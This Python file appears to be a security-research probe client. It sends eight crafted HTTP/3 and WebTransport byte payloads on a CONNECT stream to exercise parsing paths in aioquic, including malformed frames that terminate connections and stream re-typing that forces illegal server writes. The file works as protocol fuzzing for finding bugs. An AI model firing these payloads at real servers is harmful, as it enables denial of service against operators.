"""
Probe client: sends crafted byte sequences verbatim on the CONNECT stream
(the HTTP/3 capsule / session-control channel) and reports the outcome.

Each payload exploits a different parsing path in aioquic's H3 frame parser:

  A  SETTINGS (0x04, len=0)         — forbidden on request stream → H3_FRAME_UNEXPECTED
                                       aioquic calls quic.close(0x105), kills connection
  B  GOAWAY (0x07, len=1, id=0)     — forbidden on request stream → same H3_FRAME_UNEXPECTED
  C  WT_STREAM (session_id=0)       — re-types the CONNECT stream itself as WT data;
                                       echo handler gets RECV_BIDI stream_id=0 and tries
                                       to echo back on the CONNECT stream (stream_id=0)
  D  WT_STREAM then SETTINGS bytes  — re-type first, remaining bytes become WT payload;
                                       tests whether downstream echo corrupts the session
  E  Double WT_STREAM               — second re-type attempt arrives as raw WT data after
                                       the first re-type; tests idempotency of stream state
  F  WT_STREAM session_id=MAX_VARINT — session_id = 2^62-1; lookup of non-existent session
                                       with maximum integer; potential OOB / dict confusion
  G  DATA (0x00, len=5, 'hello')    — valid DATA frame; should be silently consumed since
                                       headers_recv_state is AFTER_HEADERS on CONNECT stream

Usage:
    uv run python bidi_client.py [PAYLOAD_ID] [URL]

    PAYLOAD_ID: A B C D E F G (default: all)
    URL: default https://127.0.0.1:6161/echo
"""

import asyncio
import logging
import sys
from urllib.parse import urlparse

from aioquic.asyncio import connect
from aioquic.buffer import encode_uint_var
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration

from src.webtransport_client import WebTransportClient

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")
logger = logging.getLogger(__name__)


def h3_frame(ftype: int, payload: bytes = b"") -> bytes:
    return encode_uint_var(ftype) + encode_uint_var(len(payload)) + payload


DATA_FRAME = 0x00
SETTINGS_FRAME = 0x04
GOAWAY_FRAME = 0x07
WT_STREAM = 0x41
MAX_VARINT = (1 << 62) - 1

PAYLOADS = {
    # name: (bytes, description)
    "A": (
        h3_frame(SETTINGS_FRAME),
        "SETTINGS on CONNECT stream → H3_FRAME_UNEXPECTED (0x105), kills connection",
    ),
    "B": (
        h3_frame(GOAWAY_FRAME, encode_uint_var(0)),
        "GOAWAY on CONNECT stream → H3_FRAME_UNEXPECTED (0x105), kills connection",
    ),
    "C": (
        encode_uint_var(WT_STREAM) + encode_uint_var(0) + b"AAAA",
        "WT_STREAM re-type with session_id=0 (the CONNECT stream itself); "
        "echo handler sees RECV_BIDI stream_id=0 and echoes back on the CONNECT stream",
    ),
    "D": (
        encode_uint_var(WT_STREAM) + encode_uint_var(0) + h3_frame(SETTINGS_FRAME),
        "WT_STREAM re-type; SETTINGS bytes arrive as WT payload after re-type "
        "(tests whether downstream echo corrupts the session)",
    ),
    "E": (
        encode_uint_var(WT_STREAM)
        + encode_uint_var(1)
        + b"X"
        + encode_uint_var(WT_STREAM)
        + encode_uint_var(99)
        + b"Y",
        "Double WT_STREAM: second attempt arrives as raw WT data after first re-type",
    ),
    "F": (
        encode_uint_var(WT_STREAM) + encode_uint_var(MAX_VARINT) + b"X",
        "WT_STREAM with session_id=2^62-1; non-existent session lookup at max integer",
    ),
    "G": (
        h3_frame(DATA_FRAME, b"hello"),
        "DATA frame (valid); should be silently consumed (headers_recv_state=AFTER_HEADERS)",
    ),
    "H": (
        encode_uint_var(WT_STREAM) + encode_uint_var(0) + b"AAAA",
        "WT_STREAM re-type + QUIC FIN on CONNECT stream; forces stream_ended=True so "
        "echo handler tries send_stream_data(stream_id=0, end_stream=True) — "
        "writing WT data on the H3 session control stream then closing it",
    ),
}


async def probe(url: str, label: str, payload: bytes, description: str):
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 443
    path = parsed.path or "/"
    authority = f"{host}:{port}"

    config = QuicConfiguration(
        alpn_protocols=H3_ALPN,
        is_client=True,
        verify_mode=False,
        max_datagram_frame_size=65536,
    )

    print(f"\n{'=' * 60}")
    print(f"Payload {label}: {payload.hex()}")
    print(f"  {description}")
    print(f"{'=' * 60}")

    try:
        async with connect(
            host,
            port,
            configuration=config,
            create_protocol=WebTransportClient,
        ) as protocol:
            await protocol.establish_session(authority, path)
            sid = protocol._session_id
            logger.info(
                "Session established (CONNECT stream_id=%d), sending payload", sid
            )

            if label == "H":
                # Send payload + QUIC FIN on the CONNECT stream so the server
                # sees stream_ended=True and enters the echo-back path.
                protocol._quic.send_stream_data(
                    stream_id=protocol._session_id, data=payload, end_stream=True
                )
                protocol.transmit()
            else:
                protocol.send_capsule(payload)

            # Drain any server response before closing
            await asyncio.sleep(0.5)
            if label == "H":
                # Attempt to read what the server wrote back on the CONNECT stream.
                # A compliant client should never receive WT data on stream_id=session_id,
                # so any bytes here confirm the server's illegal write.
                try:
                    q = protocol._received_messages
                    while not q.empty():
                        msg = q.get_nowait()
                        print(f"  [SERVER WROTE BACK] {msg}")
                except Exception as e:
                    print(f"  [recv drain error] {e}")
            logger.info("Payload %s: connection still alive after 500ms", label)

    except ConnectionError as e:
        print(f"  [RESULT] Connection error: {e}")
    except Exception as e:
        print(f"  [RESULT] Exception: {type(e).__name__}: {e}")
    else:
        print(f"  [RESULT] Session closed normally")


async def run(labels: list, url: str):
    for label in labels:
        payload, description = PAYLOADS[label]
        await probe(url, label, payload, description)
        # Give the server a moment to reset between connections
        await asyncio.sleep(0.2)


if __name__ == "__main__":
    args = sys.argv[1:]
    url = "https://127.0.0.1:6161/echo"
    labels = list(PAYLOADS.keys())

    for arg in args:
        if arg.upper() in PAYLOADS:
            labels = [arg.upper()]
        elif arg.startswith("https://") or arg.startswith("http://"):
            url = arg

    asyncio.run(run(labels, url))
